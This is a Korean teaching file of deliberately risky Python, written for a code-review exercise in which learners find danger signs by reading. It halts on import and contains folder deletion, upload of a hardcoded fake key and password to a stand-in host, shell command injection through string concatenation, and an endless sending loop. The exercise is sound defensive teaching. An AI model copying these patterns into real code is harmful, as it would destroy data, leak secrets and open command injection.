"""실습 12.2의 검사 대상 ② - 위험 신호를 일부러 넣은 예제 코드.

이 파일은 "AI에게 시켜서 받았다고 가정한" 합성 예제다. 실제 프로젝트 코드가 아니다.

*** 이 파일은 절대 실행하지 않는다. ***
실습 12.2는 이 파일을 **텍스트로 읽어 위험 신호를 찾을 뿐**이고, 한 줄도 실행하지 않는다.
파일 이름이 밑줄로 시작하므로 실행 증거 게이트(run_and_capture.py)도 건드리지 않는다.

안전장치를 세 겹으로 걸어 두었다.
  1. 아래 첫 줄에서 바로 멈춘다. 실수로 `python _sample_risky.py` 를 쳐도 아무 일도 안 일어난다.
  2. 위험한 줄은 전부 아무도 부르지 않는 함수 안에 있다.
  3. 삭제·전송 대상 경로와 주소를 존재하지 않는 이름으로 적어 두었다.

들어 있는 위험 신호는 다섯 종류다.
  파일 삭제 / 외부 전송 / 셸 실행 / 하드코딩된 비밀키 / 멈추지 않는 반복
"""

from __future__ import annotations

import os
import shutil
import subprocess
import urllib.request
from pathlib import Path

import requests

# --- 안전장치 1: 여기서 멈춘다. 아래 코드는 읽기용 텍스트다. ---
raise SystemExit(
    "이 파일은 실행용이 아닙니다. 실습 12.2의 검사 대상 텍스트입니다."
)

# --- 위험 신호 ①: 하드코딩된 비밀키처럼 보이는 문자열 ---------------------
# 아래 두 값은 지어낸 가짜 문자열이다. 실제로 쓰이는 키가 아니다.
API_KEY = "sk-live-0000example0000not0000real0000"
DB_PASSWORD = "example-password-not-real"

UPLOAD_URL = "https://upload.invalid/collect"
WORK_DIR = Path("__nonexistent_demo_dir__")


def clean_workspace() -> None:
    """--- 위험 신호 ②: 파일 삭제 ---

    폴더를 통째로 지운다. 어느 폴더를 지우는지 사람이 확인하지 않으면
    작업 중인 자료가 사라진다.
    """
    for leftover in WORK_DIR.glob("*.tmp"):
        os.remove(leftover)
    shutil.rmtree(WORK_DIR)


def send_report(payload: dict) -> None:
    """--- 위험 신호 ③: 외부 전송 ---

    수집한 내용을 바깥 서버로 보낸다. 무엇이 담겨 나가는지 코드만 봐서는 모른다.
    비밀키까지 함께 실어 보낸다.
    """
    requests.post(UPLOAD_URL, json=payload, headers={"X-Api-Key": API_KEY})
    urllib.request.urlopen(UPLOAD_URL + "?ping=1")


def archive_folder(folder_name: str) -> None:
    """--- 위험 신호 ④: 셸 실행 ---

    사용자가 준 문자열을 그대로 셸 명령에 붙인다. folder_name 에 명령을 끼워
    넣으면 의도하지 않은 명령이 함께 실행된다.
    """
    os.system("tar -czf backup.tar.gz " + folder_name)
    subprocess.run("echo " + folder_name, shell=True)


def watch_forever() -> None:
    """--- 위험 신호 ⑤: 멈추지 않는 반복 ---

    멈추는 조건이 없다. 한 번 시작하면 사람이 강제로 끄기 전까지 돌아간다.
    """
    counter = 0
    while True:
        counter += 1
        send_report({"tick": counter, "password": DB_PASSWORD})
